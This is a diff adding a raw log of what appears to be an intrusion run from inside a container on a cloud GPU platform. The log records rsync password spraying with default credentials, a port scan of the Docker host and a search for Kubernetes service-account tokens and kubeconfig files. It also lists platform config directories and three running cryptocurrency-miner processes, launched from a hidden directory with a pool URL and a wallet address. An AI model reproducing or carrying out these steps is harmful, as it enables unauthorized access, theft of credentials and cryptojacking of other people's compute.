@@ -1,0 +1,77 @@
+###P22START Tue Nov 24 19:31:47 UTC 2026
+=== D-SECTION-FROM-P20 ===
+=== D. RSYNC-AUTH ===
+migrate:migrate :: ssh: Could not resolve hostname rsync: Name or service not known|rsync: connection unexpectedly closed (0 bytes received so far) [Receiver]|rsync error: unexplained error (code 255) at io.c(232) [Rec
+root:root :: ssh: Could not resolve hostname rsync: Name or service not known|rsync: connection unexpectedly closed (0 bytes received so far) [Receiver]|rsync error: unexplained error (code 255) at io.c(232) [Rec
+admin:admin :: ssh: Could not resolve hostname rsync: Name or service not known|rsync: connection unexpectedly closed (0 bytes received so far) [Receiver]|rsync error: unexplained error (code 255) at io.c(232) [Rec
+migrate:onething :: ssh: Could not resolve hostname rsync: Name or service not known|rsync: connection unexpectedly closed (0 bytes received so far) [Receiver]|rsync error: unexplained error (code 255) at io.c(232) [Rec
+migrate:123456 :: ssh: Could not resolve hostname rsync: Name or service not known|rsync: connection unexpectedly closed (0 bytes received so far) [Receiver]|rsync error: unexplained error (code 255) at io.c(232) [Rec
+rsync:rsync :: ssh: Could not resolve hostname rsync: Name or service not known|rsync: connection unexpectedly closed (0 bytes received so far) [Receiver]|rsync error: error in rsync protocol data stream (code 12) 
+oneai:oneai :: ssh: Could not resolve hostname rsync: Name or service not known|rsync: connection unexpectedly closed (0 bytes received so far) [Receiver]|rsync error: unexplained error (code 255) at io.c(232) [Rec
+root:/&S2)n@W1G :: rsync: getaddrinfo: root 873: Name or service not known|rsync error: error in socket IO (code 10) at clientserver.c(141) [Receiver=3.2.7]|
+migrate:/&S2)n@W1G :: rsync: getaddrinfo: migrate 873: Name or service not known|rsync error: error in socket IO (code 10) at clientserver.c(141) [Receiver=3.2.7]|
+migrate:Onething@2024 :: ssh: Could not resolve hostname rsync: Name or service not known|rsync: connection unexpectedly closed (0 bytes received so far) [Receiver]|rsync error: unexplained error (code 255) at io.c(232) [Rec
+x:y :: ssh: Could not resolve hostname rsync: Name or service not known|rsync: connection unexpectedly closed (0 bytes received so far) [Receiver]|rsync error: unexplained error (code 255) at io.c(232) [Rec
+=== E. HOSTSSHD-SPRAY2 ===
+=== TOOLING ===
+/usr/bin/rsync /usr/bin/ssh /usr/bin/python3 
+/usr/bin/sshpass
+=== DIRECT 172.17.0.1 PORTS ===
+OPEN 1234 b'@RSYNCD: 31.0\n'
+OPEN 8081 b'HTTP/1.0 404 Not Found\r\nContent-Type: text/plain; charset=utf-8\r\nX-Content-Type-'
+OPEN 8429 b'HTTP/1.0 400 Bad Request\r\nContent-Type: text/plain; charset=utf-8\r\nVary: Accept-'
+OPEN 9100 b'HTTP/1.0 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Tue, 24 Nov 2026 '
+OPEN 10221 b'HTTP/1.0 404 Not Found\r\nContent-Type: text/plain; charset=utf-8\r\nX-Content-Type-'
+OPEN 10250 b'<TimeoutError>'
+OPEN 2025 b'HTTP/1.0 404 Not Found\r\nContent-Type: text/plain\r\nDate: Tue, 24 Nov 2026 19:31:5'
+=== KUBE/SA TOKEN HUNT ===
+ls: cannot access '/var/run/secrets/kubernetes.io/serviceaccount/': No such file or directory
+miss /var/run/secrets/kubernetes.io/serviceaccount/token
+miss /run/secrets/kubernetes.io/serviceaccount/token
+miss /var/lib/kubelet/kubeconfig
+miss /etc/rancher/k3s/k3s.yaml
+miss /root/.kube/config
+miss /root/k3s.yaml
+miss /etc/kubernetes/kubelet.conf
+FOUND /.onething/instance/configmap 4096
+miss /root/onethingai-fs/.kube/config
+--- env token hints
+--- find kubeconfig/token
+/root/miniconda3/lib/python3.10/site-packages/jupyterlab/tests/mock_packages/interop/token
+/root/miniconda3/pkgs/jupyterlab-4.0.3-pyhd8ed1ab_0/site-packages/jupyterlab/tests/mock_packages/interop/token
+=== PLATFORM CONFIG DIRS ===
+/.onething/:
+total 8
+drwxr-xr-x 3 root root   30 Feb 28  2026 .
+drwxr-xr-x 1 root root 4096 Aug 14 14:08 ..
+drwxr-xr-x 5 root root 4096 Nov 24 19:26 instance
+
+/.onething/instance/:
+total 16
+drwxr-xr-x 5 root root 4096 Nov 24 19:26 .
+drwxr-xr-x 3 root root   30 Feb 28  2026 ..
+drwxr-xr-x 2 root root 4096 Aug 10  2025 configmap
+drwxr----- 4 root root 4096 Nov 24 19:26 tools
+drwxr----- 4 root root 4096 Aug 10  2025 tools.old
+
+/root/onethingai-fs/:
+total 32
+drwxr-xr-x 7 root root 4096 Sep 23 13:41 .
+drwx------ 1 root root 4096 Nov 25 03:27 ..
+-r-------- 1 root root    0 Nov 21 21:41 .accesslog
+lrwxrwxrwx 1 root root   24 Aug 28 15:13 .cloud_storage_disabled -> /.cloud_storage_disabled
+-r-------- 1 root root 2585 Nov 21 21:41 .config
+-r--r--r-- 1 root root    0 Nov 21 21:41 .stats
+drwxr-xr-x 6 root root 4096 Jan 15  2026 data1
+drwxr-xr-x 3 root root 4096 Feb 27  2026 enviroment
+drwxr-xr-x 3 root root 4096 Aug 28 14:30 h3d
+drwxr-xr-x 2 root root 4096 Nov 25 00:39 mydata
+drwxr-xr-x 3 root root 4096 Jan 15  2026 mymodels
+=== PLATFORM CONFIG CONTENT ===
+/.onething/instance/configmap/proxyNetConfig.json
+/root/onethingai-fs/mymodels/Juggernaut-X-v10/model_index.json
+=== PEAKMINER-LIVE ===
+25182 bash -c while true; do timeout 300 /root/.hk/peakminer --url stratum+tcp://prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-116-211-127-168-g1 --coin pearl -d 1 -p x -i 30 >> /root/.hk/kx-g1.log 2>&1; sleep 5; done
+64152 timeout 900 /root/.hk/peakminer --url stratum+tcp://127.0.0.1:18048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-116-211-127-168-g0 --coin pearl -d 0 -p x -i 30
+64153 /root/.hk/peakminer --url stratum+tcp://127.0.0.1:18048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-116-211-127-168-g0 --coin pearl -d 0 -p x -i 30
+###P22END Tue Nov 24 19:31:59 UTC 2026
